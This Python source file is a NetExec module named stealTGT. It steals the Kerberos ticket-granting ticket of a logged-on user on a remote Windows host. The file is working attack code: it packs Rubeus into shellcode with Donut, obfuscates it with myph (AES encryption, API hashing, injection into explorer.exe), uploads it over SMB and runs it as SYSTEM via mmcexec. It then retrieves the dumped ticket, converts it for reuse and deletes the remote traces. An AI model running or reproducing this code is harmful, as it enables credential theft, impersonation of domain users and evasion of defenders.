r"""
NetExec module to steal the TGT of a logged-on user.
Uses mmcexec to execute Rubeus as SYSTEM.

Usage:
    nxc smb <ip> -u admin -p pass --local-auth -M stealTGT -o USER=target RUBEUS=/path/Rubeus.exe
"""

import re, base64, subprocess, time, random, string
from pathlib import Path

from nxc.helpers.misc import CATEGORY, gen_random_string


def random_name(ext='', length=8):
    chars = string.ascii_letters + string.digits
    rnd = ''.join(random.choices(chars, k=length))
    return f"{rnd}.{ext}" if ext else rnd


def check_tools(logger):
    for tool in ['donut', 'myph', 'impacket-ticketConverter']:
        if subprocess.call(['which', tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
            logger.fail(f"{tool} not found in PATH")
            return False
    return True


class NXCModule:
    name        = "stealTGT"
    description = "Steal TGT of a logged-in user (Rubeus + Donut + myph)"
    supported_protocols = ["smb"]
    category    = CATEGORY.CREDENTIAL_DUMPING
    opsec_safe  = False
    multiple_hosts = False

    def options(self, context, module_options):
        self.target_user = module_options.get("USER")
        self.rubeus_path = module_options.get("RUBEUS")
        self.output_loc  = module_options.get("LOCATION", "C:\\Users\\Public")
        self.share       = "C$"
        self.temp_remote = []
        self.temp_local  = []

    def on_admin_login(self, context, connection):
        logger = context.log

        if not self.target_user:
            logger.fail("Specify USER=<username>")
            return
        if not self.rubeus_path or not Path(self.rubeus_path).is_file():
            logger.fail("RUBEUS= invalid path or file not found")
            return
        if not check_tools(logger):
            return

        # Check active session
        logger.display(f"Checking active session for {self.target_user}...")
        try:
            sessions = connection.execute("query session", get_output=True)
            if not sessions or self.target_user.lower() not in sessions.lower():
                logger.fail(f"{self.target_user} has no active session.")
                return
            logger.success(f"{self.target_user} is logged in.")
        except Exception as e:
            logger.fail(f"Error querying sessions: {e}")
            return

        # Prepare local workdir
        workdir = Path.home() / '.nxc' / 'tmp'
        workdir.mkdir(parents=True, exist_ok=True)

        shellcode_bin = workdir / random_name(ext='bin')
        rubeus_exe    = workdir / random_name(ext='exe')
        rubeus_out    = random_name(ext='txt')

        remote_exe_path = f"{self.output_loc}\\{rubeus_exe.name}"
        remote_out_path = f"{self.output_loc}\\{rubeus_out}"
        remote_exe_unc  = remote_exe_path.replace("C:\\", "")
        remote_out_unc  = remote_out_path.replace("C:\\", "")

        # Donut
        logger.display("Generating shellcode with Donut...")
        cmd_donut = [
            'donut',
            '-i', self.rubeus_path,
            '-a', '2', '-e', '3', '-z', '1', '-b', '3', '-k', '1',
            '-p', f'dump /user:{self.target_user} /nowrap /consoleoutfile:{remote_out_path}',
            '-o', str(shellcode_bin),
        ]
        try:
            subprocess.run(cmd_donut, check=True, capture_output=True)
        except subprocess.CalledProcessError as e:
            logger.fail(f"Donut failed: {e.stderr.decode()}")
            return
        self.temp_local.append(shellcode_bin)

        # myph
        logger.display("Obfuscating with myph...")
        out_base = str(rubeus_exe.with_suffix(''))
        cmd_myph = [
            'myph',
            '--shellcode',  str(shellcode_bin),
            '--out',        out_base,
            '--process',    'explorer.exe',
            '--encryption', 'AES',
            '--sleep-time', '12',
            '--use-api-hashing',
        ]
        try:
            subprocess.run(cmd_myph, check=True, capture_output=True)
        except subprocess.CalledProcessError as e:
            logger.fail(f"myph failed: {e.stderr.decode()}")
            self.cleanup(context, connection)
            return
        if not rubeus_exe.is_file():
            logger.fail(f"myph did not generate {rubeus_exe}")
            self.cleanup(context, connection)
            return
        self.temp_local.append(rubeus_exe)

        # Upload exe
        logger.display(f"Uploading {rubeus_exe.name} -> {remote_exe_path}...")
        try:
            connection.conn.putFile(self.share, remote_exe_unc, open(rubeus_exe, 'rb').read)
            logger.success("Executable uploaded.")
            self.temp_remote.append((self.share, remote_exe_unc))
        except Exception as e:
            logger.fail(f"Upload failed: {e}")
            self.cleanup(context, connection)
            return

        # Execute as SYSTEM via mmcexec
        logger.display("Executing Rubeus as SYSTEM via mmcexec...")
        old_method = connection.args.exec_method
        connection.args.exec_method = 'mmcexec'
        try:
            connection.execute(remote_exe_path, get_output=False)
            logger.success("Command sent.")
        except Exception as e:
            logger.fail(f"mmcexec error: {e}")
            connection.args.exec_method = old_method
            self.cleanup(context, connection)
            return
        connection.args.exec_method = old_method

        # Wait for output
        logger.display("Waiting for Rubeus output (30s)...")
        time.sleep(30)

        # Download result
        local_dump = workdir / f"rubeus_dump_{random_name(ext='txt')}"
        got_file = False
        logger.display(f"Downloading {remote_out_path}...")

        for attempt in range(3):
            try:
                with open(local_dump, 'wb') as f:
                    connection.conn.getFile(self.share, remote_out_unc, f.write)
                got_file = True
                logger.success(f"Output downloaded to {local_dump}")
                self.temp_remote.append((self.share, remote_out_unc))
                break
            except Exception as e:
                logger.display(f"Attempt {attempt+1}/3 failed: {e} — retrying in 5s...")
                time.sleep(5)

        if not got_file:
            logger.display("Fallback: reading output via execute...")
            old_method = connection.args.exec_method
            connection.args.exec_method = 'wmiexec'
            raw = connection.execute(f"type {remote_out_path}", get_output=True)
            connection.args.exec_method = old_method
            if raw and "cannot find" not in raw.lower() and "no se puede" not in raw.lower():
                local_dump.write_text(raw, encoding='utf-8')
                got_file = True
                logger.success("Output obtained via execute fallback.")

        if not got_file:
            logger.fail("Could not retrieve Rubeus output.")
            self.cleanup(context, connection)
            return

        self.temp_local.append(local_dump)

        # Clean remote artifacts
        logger.display("Cleaning remote artifacts...")
        self._clean_remote(connection, logger)

        # Process ticket
        try:
            content = local_dump.read_text(encoding='utf-8', errors='replace')
        except Exception as e:
            logger.fail(f"Error reading local dump: {e}")
            self.cleanup(context, connection)
            return

        if 'Base64EncodedTicket' not in content:
            if 'Current LUID' in content:
                logger.fail(f"Rubeus ran but found no TGT for {self.target_user} (possible NTLM auth).")
            else:
                logger.fail("Rubeus produced no expected output — possible execution failure.")
            self.cleanup(context, connection)
            return

        match = re.search(
            r'Base64EncodedTicket\s*:\s*\n\s*((?:[A-Za-z0-9+/=]+\s*)+)',
            content
        )
        if not match:
            logger.fail("Could not extract TGT (unexpected format).")
            self.cleanup(context, connection)
            return

        b64 = re.sub(r'\s+', '', match.group(1))
        b64 += '=' * (-len(b64) % 4)

        kirbi_path  = workdir / f"{self.target_user}.kirbi"
        ccache_path = Path.cwd() / f"{self.target_user}.ccache"
        try:
            kirbi_path.write_bytes(base64.b64decode(b64))
        except Exception as e:
            logger.fail(f"Error decoding base64: {e}")
            self.cleanup(context, connection)
            return

        try:
            subprocess.run(
                ['impacket-ticketConverter', str(kirbi_path), str(ccache_path)],
                check=True, capture_output=True
            )
        except subprocess.CalledProcessError as e:
            logger.fail(f"ticketConverter failed: {e.stderr.decode()}")
            self.cleanup(context, connection)
            return

        logger.success(f"Ticket ready: {ccache_path}")
        logger.display(f"  export KRB5CCNAME=$(pwd)/{ccache_path.name} && klist")
        self.cleanup(context, connection)

    def _clean_remote(self, connection, logger):
        for share, path in self.temp_remote:
            try:
                connection.conn.deleteFile(share, path)
                logger.display(f"Deleted remote: {path}")
            except Exception as e:
                logger.display(f"Could not delete {path}: {e}")
        self.temp_remote.clear()

    def cleanup(self, context, connection):
        logger = context.log
        self._clean_remote(connection, logger)
        for f in self.temp_local:
            try:
                Path(f).unlink(missing_ok=True)
            except:
                pass
        self.temp_local.clear()
